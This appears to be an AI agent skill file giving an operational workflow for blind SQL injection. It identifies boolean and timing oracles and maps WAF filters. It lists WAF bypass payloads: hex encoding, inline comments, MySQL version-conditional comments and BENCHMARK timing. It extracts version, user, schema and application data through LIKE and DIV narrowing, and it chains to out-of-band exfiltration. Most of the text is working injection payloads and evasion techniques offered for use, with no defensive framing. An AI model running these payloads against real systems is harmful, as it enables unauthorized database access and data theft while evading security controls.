---
name: blind-sqli-extraction
description: "Extract data from boolean and timing-based blind SQL injection points. Use when you have a confirmed injection point with a reliable oracle but no direct output — covers oracle identification, WAF bypass, and efficient extraction via LIKE narrowing and DIV bisection."
---

# Blind SQLi Extraction

You have confirmed SQL injection. The application does not return query results directly. You need to extract data one condition at a time through a boolean or timing oracle.

## Pattern

- Injectable parameter confirmed (boolean differential or timing differential)
- No UNION/error-based output available
- Need to extract version, user, schema, or application data
- WAF may block common keywords or quote characters

## Workflow

### 1. Identify the Oracle

The oracle is the observable difference between TRUE and FALSE conditions. Find it before extracting anything.

| Oracle Type | Signal | Example |
|---|---|---|
| Boolean (response body) | JSON field value changes, result count differs, content present/absent | `paging.total = 5` (TRUE) vs `paging.total = 0` (FALSE) |
| Boolean (status code) | 200 vs 500, 200 vs 302 | Inject `' AND 1=1--` vs `' AND 1=0--` |
| Boolean (response size) | Byte count delta >10 bytes | TRUE returns full page, FALSE returns empty/error |
| Timing | Response time delta >2s | `' AND IF(1=1,SLEEP(3),0)--` vs baseline |

**Validation:** Always confirm with a known-true (`1=1`) and known-false (`1=0`) pair before extraction. If both return the same oracle value, the injection point is not usable.

### 2. Map WAF Restrictions

Before building payloads, identify what the WAF blocks. Test each element independently:

```
Quotes:        ' " ` (try hex 0x encoding as bypass)
Whitespace:    SPACE TAB (try /**/ or %09)
Keywords:      SELECT UNION WHERE AND OR (try case mixing, inline comments)
Functions:     SLEEP BENCHMARK IF CASE SUBSTRING (try aliases)
Operators:     = < > (try LIKE, BETWEEN, DIV)
Comments:      -- # /**/ (try ;%00)
```

### 3. Extract Data

Use the `BlindSQLiTools` toolset. Three extraction methods available:

- `sqli_test_condition` -- test a single boolean condition
- `sqli_extract_string` -- character-by-character string extraction via LIKE
- `sqli_extract_int` -- integer extraction via DIV narrowing

Start with version and user identification, then enumerate schema, then extract target data.

**Extraction order:**
1. `@@version` -- confirms DBMS and informs syntax choices
2. `CURRENT_USER` or `user()` -- identifies privilege level
3. Schema enumeration -- `information_schema.tables`, `information_schema.columns`
4. Target data -- application-specific tables

## WAF Bypass Patterns

| Blocked | Bypass | Notes |
|---|---|---|
| Single quotes `'` | `0x` hex encoding | `'admin'` becomes `0x61646d696e` |
| `SPACE` | Inline comment `/**/` | `AND/**/1=1` |
| `SPACE` | Tab `%09` or newline `%0a` | `AND%091=1` |
| `AND` / `OR` | `&&` / `\|\|` | MySQL only |
| `AND` / `OR` | Case mixing `AnD` | Some WAFs are case-sensitive |
| `SELECT` | `/*!50000SELECT*/` | MySQL version-conditional comments |
| `=` | `LIKE` or `BETWEEN...AND` | `@@version LIKE 0x382e30%` |
| `SUBSTRING` | `MID()` or `LEFT()`/`RIGHT()` | MySQL alternatives |
| `SLEEP` | `BENCHMARK(5000000,SHA1('x'))` | CPU-based timing alternative |
| `IF()` | `CASE WHEN...THEN...ELSE...END` | ANSI SQL, broader compat |
| Comma `,` | `CASE WHEN` instead of `IF(x,y,z)` | Also `LIMIT 1 OFFSET 0` instead of `LIMIT 0,1` |
| `information_schema` | `sys.schema_table_statistics` | MySQL 5.7+ alternative |

### Stacked Bypass (MySQL)

When inline injection is blocked, version-conditional comments can wrap entire clauses:

```sql
/*!50000CASE*/+WHEN+{condition}+THEN+0+ELSE+1+/*!50000END*/
```

### Quote-Free String Comparison

Hex encoding eliminates quotes entirely:

```sql
@@version=0x382e302e3137    -- tests if version equals '8.0.17'
user() LIKE 0x726f6f7425    -- tests if user starts with 'root'
```

## Extraction Techniques

### LIKE Character-by-Character

Extract strings one character at a time using LIKE with wildcard:

```
@@version LIKE 0x38%          -- starts with '8'?     TRUE
@@version LIKE 0x382e%        -- starts with '8.'?    TRUE
@@version LIKE 0x382e30%      -- starts with '8.0'?   TRUE
```

Worst case: 70 requests per character (full charset). Average: ~35 per character.

### DIV Integer Narrowing

Extract integers by narrowing thousands, hundreds, tens, then exact:

```
@@port DIV 1000=3       -- port is 3000-3999?  TRUE
@@port DIV 100=33       -- port is 3300-3399?  TRUE
@@port DIV 10=330       -- port is 3300-3309?  TRUE
@@port=3306             -- port is 3306?       TRUE
```

Total: 30-96 requests regardless of value magnitude. Far more efficient than character extraction for numbers.

### Known-Value Shortcut

When extracting from a finite set (version strings, usernames, table names), test exact matches first:

```
@@version=0x382e302e3137    -- '8.0.17'?  FALSE
@@version=0x382e302e3333    -- '8.0.33'?  TRUE  (1 request instead of 35+)
```

Pass common values via `known_values` parameter to try before falling back to character extraction.

## Indicators

- **Oracle confirmed:** Known-true and known-false conditions produce reliably different oracle values
- **Extraction working:** Extracted value is confirmed with exact-match test after LIKE narrowing
- **WAF bypassed:** Payloads return expected oracle responses instead of WAF block pages
- **Privilege identified:** `CURRENT_USER` extraction reveals the database account and privilege level

## Chain With

- **timing-attack-recon** -- discover the injection point via timing differentials
- **parser-differential-bypass** -- WAF bypass via encoding differentials between WAF parser and backend DB
- **403-bypass** -- access blocked endpoints that may have weaker input validation
- **data-exfil** -- exfiltrate extracted data through OOB channels when boolean oracle is unreliable
